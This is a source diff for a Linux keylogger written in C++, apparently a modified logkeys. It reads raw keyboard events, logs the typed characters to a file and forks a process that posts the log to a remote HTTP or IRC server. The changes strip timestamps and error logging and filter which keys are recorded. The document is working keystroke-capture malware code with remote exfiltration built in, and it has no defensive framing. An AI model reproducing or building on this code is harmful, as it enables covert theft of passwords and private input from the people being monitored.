@@ -469,26 +469,14 @@ int main(int argc, char **argv)
   stat(args.logfile.c_str(), &st);
   off_t file_size = st.st_size;  // log file is currently file_size bytes "big"
   int inc_size;  // is added to file_size in each iteration of keypress reading, adding number of bytes written to log file in that iteration
-  
-//  time_t cur_time;
-//  time(&cur_time);
-//#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
-//  strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
-  
+    
 /*
 while (!feof(out)){
 	wchar_t aCh;
 	fscanf(out, "%lc", &aCh);
 	fprintf(out, "ay");
 }*/
-
-//No timeStamps!!
-/*
-  if (args.flags & FLAG_NO_TIMESTAMPS)
-    file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
-  else
-    file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);*/
-  fflush(out);
+fflush(out);
 
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
@@ -530,16 +518,8 @@ while (!feof(out)){
         error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
       
       file_size = 0;  // new log file is now empty
-      
-      // write new timestamp
-      //time(&cur_time);
-      //strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
-     // if (args.flags & FLAG_NO_TIMESTAMPS)
-     //   file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
-    //  else
-    //    file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
-      
-      if (!args.http_url.empty() || !args.irc_server.empty()) {
+ 
+     if (!args.http_url.empty() || !args.irc_server.empty()) {
         switch (fork()) {
         case -1: error(0, errno, "Error while forking remote-posting process");
         case 0:  
@@ -565,31 +545,10 @@ while (!feof(out)){
     
     // on key press
     if (event.value == EV_MAKE) {
-      /*
-      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
-      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
-          (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
-        if (ctrl_in_effect)
-          inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
-//No stamps       
-	// if (args.flags & FLAG_NO_TIMESTAMPS)
-          inc_size += fprintf(out, "\n");
-        else {
-          strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
-          inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
-        }
-        if (inc_size > 0) file_size += inc_size;
-        continue;  // but don't log "<Enter>"
-      }*/
-      
       if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
         shift_in_effect = true;
       if (scan_code == KEY_RIGHTALT)
         altgr_in_effect = true;
-      //if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
-        //ctrl_in_effect = true;
-      
-      // print character or string coresponding to received keycode; only print chars when not \0
       if (is_char_key(scan_code)) {
         wchar_t wch;
         if (altgr_in_effect) {
@@ -610,7 +569,6 @@ while (!feof(out)){
           wch = char_keys[to_char_keys_index(scan_code)];
         
 
-//THERE IT IS
         if (wch != L'\0' && ((scan_code==14) || (scan_code>15 && scan_code<26) || (scan_code>29 && scan_code<39) || (scan_code>43 && scan_code<51))){
 		inc_size += fprintf(out, "%lc", wch);  // write character to log file
 		to_tree(wch);
@@ -632,8 +590,6 @@ while (!feof(out)){
         }
       }
 
-//DON'T LOG ERRORS...I DON'T REALLY CARE
-      //else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
     } // if (EV_MAKE)
     
     // on key release
@@ -642,8 +598,6 @@ while (!feof(out)){
         shift_in_effect = false;
       if (scan_code == KEY_RIGHTALT)
         altgr_in_effect = false;
-//      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
-//        ctrl_in_effect = false;
     }
     
     prev_code = scan_code;
@@ -651,12 +605,7 @@ while (!feof(out)){
     if (inc_size > 0) file_size += inc_size;
     
   } // while (read(input_fd))
-  
-  // append final timestamp, close files and exit
- // time(&cur_time);
-  //strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
-  //fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
-  
+    
   fclose(out);
   
   remove(PID_FILE);
